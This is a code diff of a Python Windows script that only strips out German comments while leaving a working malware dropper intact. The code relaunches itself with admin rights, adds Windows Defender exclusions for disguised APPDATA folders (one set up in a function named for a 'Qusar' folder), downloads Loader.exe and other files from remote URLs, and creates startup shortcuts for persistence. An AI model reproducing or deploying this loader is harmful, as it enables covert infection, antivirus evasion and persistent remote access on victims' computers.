@@ -17,18 +17,15 @@ def is_admin():
 
 def run_as_admin():
     try:
-        # Verwende sys.executable, um die EXE selbst neu zu starten
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
     except Exception as e:
         messagebox.showerror("Error", f"Failed to run as admin: {str(e)}")
     sys.exit(0)
 
 def create_shortcut(target_path, shortcut_name=None):
-    """Erstellt Verknüpfung im Startup-Ordner"""
     try:
         if shortcut_name is None:
             shortcut_name = os.path.splitext(os.path.basename(target_path))[0]
-        
         
         startup_folder = os.path.join(
             os.getenv('APPDATA'), 
@@ -41,7 +38,6 @@ def create_shortcut(target_path, shortcut_name=None):
         
         shortcut_path = os.path.join(startup_folder, f"{shortcut_name}.lnk")
         
-        # Prüfe, ob die Zieldatei existiert
         if not os.path.exists(target_path):
             raise FileNotFoundError(f"Zieldatei {target_path} existiert nicht!")
         
@@ -51,7 +47,6 @@ def create_shortcut(target_path, shortcut_name=None):
         shortcut.WorkingDirectory = os.path.dirname(target_path)
         shortcut.save()
         
-        # Prüfe, ob die Verknüpfung erstellt wurde
         if not os.path.exists(shortcut_path):
             raise Exception("Verknüpfung wurde nicht im Startup-Ordner erstellt!")
         
@@ -61,7 +56,6 @@ def create_shortcut(target_path, shortcut_name=None):
         return False
 
 def download_file(url, target_dir):
-    """Lädt Datei herunter und gibt Pfad zurück"""
     try:
         if not os.path.exists(target_dir):
             os.makedirs(target_dir)
@@ -73,7 +67,6 @@ def download_file(url, target_dir):
         urllib.request.urlretrieve(url, save_path)
         print(f"Download erfolgreich: {file_name}")
         
-        # Überprüfen ob es eine echte EXE-Datei ist
         if file_name.endswith('.exe'):
             with open(save_path, 'rb') as f:
                 if b'This program cannot be run in DOS mode' not in f.read(1024):
@@ -86,7 +79,6 @@ def download_file(url, target_dir):
         return None
 
 def create_qusar_folder():
-    """Erstellt den Qusar-Ordner und fügt Windows Defender Ausnahme hinzu"""
     try:
         qusar_folder = os.path.join(os.getenv('APPDATA'), 'Windows-System')
         
@@ -115,14 +107,12 @@ def main():
             run_as_admin()
             return 0
 
-        # Konfiguration
         DOWNLOAD_URLS = [
             "https://github.com/BananenbrotV1/-/raw/main/Loader.exe",
             "Link2",
             "Link3",
         ]
         
-        # Ordner erstellen
         qusar_folder = create_qusar_folder()
         if not qusar_folder:
             return 1
@@ -130,7 +120,6 @@ def main():
         HIDDEN_FOLDER = "SystemApps"
         TARGET_DIR = os.path.join(os.getenv('APPDATA'), HIDDEN_FOLDER)
         
-        # Windows Defender Ausnahmen
         for folder in [TARGET_DIR, qusar_folder]:
             try:
                 subprocess.run(
@@ -140,7 +129,6 @@ def main():
             except subprocess.CalledProcessError as e:
                 print(f"Fehler bei Defender-Ausnahme für {folder}: {e.stderr.decode()}")
 
-        # Hauptprozess
         for url in DOWNLOAD_URLS:
             file_path = download_file(url, TARGET_DIR)
             if file_path:
